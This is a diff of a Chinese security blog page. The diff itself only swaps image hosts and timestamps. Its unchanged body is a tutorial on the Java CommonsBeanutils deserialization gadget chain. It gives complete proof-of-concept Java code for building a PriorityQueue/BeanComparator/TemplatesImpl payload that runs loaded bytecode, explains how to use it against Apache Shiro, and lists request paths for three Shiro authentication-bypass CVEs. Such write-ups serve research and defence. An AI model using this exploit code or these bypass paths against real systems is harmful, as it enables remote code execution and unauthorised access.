@@ -27,19 +27,19 @@
 <meta property="og:site_name" content="Y0ng的博客">
 <meta property="og:description" content="前言这篇将介绍一下  CommonsBeanutils 链，以及没有 commons-collections 的Shiro反序列化利用 Apache Commons BeanutilsApache Commons Beanutils  提供了对Java普通类对象（也成为 JavaBean） 的一些操作方法。 至于JavaBean  有一个public的无参数构造函数。 属性可以透过get、set、">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309155025401.png">
-<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309155316931.png">
-<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309155804696.png">
-<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309163136570.png">
-<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309163313045.png">
-<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309164648452.png">
-<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309164809686.png">
-<meta property="og:image" content="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309170133185.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/e9a00cb309fdabed4c5b08e593dc9cf1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/7d1c0bde75644f9fc045a5e38b3f414b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/12de11915947c8706214fb248a759aa1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/e9983e81daf06a98f8a807af46eeaf02.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/54404185569de03bd22c7d217ac31a34.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/e8074aeecd1c7d6ee6911e72794b0e96.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/b6f52f80ee3f04350d781eeb97a35f4b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/3f68a5c855798bbf681c697df0a6e8cf.png">
 <meta property="article:published_time" content="2022-03-09T09:06:58.935Z">
-<meta property="article:modified_time" content="2022-03-09T12:33:22.234Z">
+<meta property="article:modified_time" content="2022-03-29T15:22:39.798Z">
 <meta property="article:author" content="Y0ng">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309155025401.png">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/img_convert/e9a00cb309fdabed4c5b08e593dc9cf1.png">
 
 <link rel="canonical" href="http://example.com/2022/03/09/CB%E9%93%BE/">
 
@@ -144,7 +144,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">168</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">170</span></a>
 
   </li>
         <li class="menu-item menu-item-schedule">
@@ -229,10 +229,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-03-09 17:06:58 / 修改时间：20:33:22" itemprop="dateCreated datePublished" datetime="2022-03-09T17:06:58+08:00">2022-03-09</time>
+              <time title="创建时间：2022-03-09 17:06:58" itemprop="dateCreated datePublished" datetime="2022-03-09T17:06:58+08:00">2022-03-09</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-29 23:22:39" itemprop="dateModified" datetime="2022-03-29T23:22:39+08:00">2022-03-29</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -283,28 +289,28 @@
 
 <p>并不是说真的去调用 Person 类的 abc 属性的 getter，而是调用getAbc()，不管这个类有没有abc属性。</p>
 <h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><p>也就是说当调用 <strong>PropertyUtils.getProperty(o1, property)</strong> 时 如果控制了<strong>o1</strong>，会自动调用 getter 方法，需要寻找一处<strong>符合getter格式</strong>的利用点，起到承上启下的作用，在 <strong>TemplatesImpl</strong> 中的 <strong>getOutputProperties()</strong> 符合条件，调用 <strong>newTransformer()</strong> 最后利用点最后调用到defineClass实现动态类加载。</p>
-<p><img src="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309155025401.png" alt="image-20220309155025401"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e9a00cb309fdabed4c5b08e593dc9cf1.png" alt="image-20220309155025401"></p>
 <p>向上需要寻找调用 <strong>getProperty()</strong> 的地方，commons-beanutils 里有一个 <strong>BeanComparator</strong> 类的 <strong>compare</strong>方法，以这里为起点，串起了整条链子</p>
-<p><img src="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309155316931.png" alt="image-20220309155316931"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7d1c0bde75644f9fc045a5e38b3f414b.png" alt="image-20220309155316931"></p>
 <p>那么最开始是从<strong>哪个readObject才能调用compare方法</strong>？在CC2中知道 <strong>PriorityQueue</strong> 重写了readObject方法，执行了<strong>java.util.Comparator</strong> 接口的 <strong>compare()</strong> 方法，至此链子完整</p>
-<p><img src="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309155804696.png" alt="image-20220309155804696"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/12de11915947c8706214fb248a759aa1.png" alt="image-20220309155804696"></p>
 <h1 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> CB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CB</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//创建TemplateImpl 对象动态加载字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] code = ClassPool.getDefault().get(<span class="string">&quot;bytecode.Calc&quot;</span>).toBytecode();</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="comment">//setFieldValue(obj,&quot;_class&quot;,null);</span></span><br><span class="line">        <span class="comment">//setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建BeanComparator</span></span><br><span class="line">        Comparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//先设置为正常变量值，后面可以通过setFieldValue修改</span></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射设置 Field</span></span><br><span class="line">        Object[] objects = <span class="keyword">new</span> Object[]&#123;obj,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;);</span></span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, objects);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filname)</span> <span class="keyword">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(Filname);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>在序列化的时候报错，在 BeanComparator </p>
-<p><img src="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309163136570.png" alt="image-20220309163136570"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e9983e81daf06a98f8a807af46eeaf02.png" alt="image-20220309163136570"></p>
 <p>跟进，没有找到 ComparableComparator ，这个类来自于 commons.collections ，但是已经进行了删除</p>
-<p><img src="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309163313045.png" alt="image-20220309163313045"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/54404185569de03bd22c7d217ac31a34.png" alt="image-20220309163313045"></p>
 <p>所以需要找一个可以替换的，需要满足</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">实现java.util.Comparator 接口</span><br><span class="line">实现java.io.Serializable 接口</span><br><span class="line">Java、shiro或commons-beanutils自带，且兼容性强</span><br></pre></td></tr></table></figure>
 
 <p>通过IDEA的快捷键Ctrl+Alt+B搜索接口的实现类。找到了<strong>CaseInsensitiveComparator</strong>。</p>
-<p><img src="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309164648452.png" alt="image-20220309164648452"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e8074aeecd1c7d6ee6911e72794b0e96.png" alt="image-20220309164648452"></p>
 <p>可以通过 <strong>CASE_INSENSITIVE_ORDER</strong> 拿到 CaseInsensitiveComparator 类</p>
 <blockquote>
 <p>这个CaseInsensitiveComparator 类是java.lang.String 类下的一个内部私有类，其实现了Comparator 和Serializable ，且位于Java的核心代码中，兼容性强，是一个完美替代品。我们通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的CaseInsensitiveComparator 对象，用它来实例化 BeanComparator。</p>
 </blockquote>
 <p>然后用 BeanComparator 第三种构造方法</p>
-<p><img src="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309164809686.png" alt="image-20220309164809686"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b6f52f80ee3f04350d781eeb97a35f4b.png" alt="image-20220309164809686"></p>
 <h1 id="最终poc"><a href="#最终poc" class="headerlink" title="最终poc"></a>最终poc</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> CB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.String.CASE_INSENSITIVE_ORDER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CB</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//创建TemplateImpl 对象动态加载字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] code = ClassPool.getDefault().get(<span class="string">&quot;bytecode.Calc&quot;</span>).toBytecode();</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="comment">//setFieldValue(obj,&quot;_class&quot;,null);</span></span><br><span class="line">        <span class="comment">//setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建BeanComparator</span></span><br><span class="line">        Comparator comparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>,CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//先设置为正常变量值，后面可以通过setFieldValue修改</span></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射设置 Field</span></span><br><span class="line">        Object[] objects = <span class="keyword">new</span> Object[]&#123;obj,<span class="number">1</span>&#125;;</span><br><span class="line">        setFieldValue(comparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, objects);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filname)</span> <span class="keyword">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(Filname);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h1 id="shiro中的利用"><a href="#shiro中的利用" class="headerlink" title="shiro中的利用"></a>shiro中的利用</h1><p>在shiro中如果没有CC依赖，可以利用CB链，因为shiro 是依赖于 commons-beanutils 的,去掉pom.xml中的CC依赖，python生成payload</p>
@@ -312,12 +318,13 @@
 
 
 
-<p><img src="https://gitee.com/yongsheng220/image/raw/master/shiro/image-20220309170133185.png" alt="image-20220309170133185"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3f68a5c855798bbf681c697df0a6e8cf.png" alt="image-20220309170133185"></p>
 <h1 id="shiro-权限绕过"><a href="#shiro-权限绕过" class="headerlink" title="shiro 权限绕过"></a>shiro 权限绕过</h1><h2 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;xxx&#x2F;..;&#x2F;admin</span><br></pre></td></tr></table></figure>
 
 <h2 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;;&#x2F;admin</span><br><span class="line">&#x2F;admin&#x2F;a%25%32%66a</span><br></pre></td></tr></table></figure>
 
 <h2 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;admin&#x2F;%3baaa</span><br></pre></td></tr></table></figure>
+
 
 
     </div>
@@ -415,7 +422,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">168</span>
+          <span class="site-state-item-count">170</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
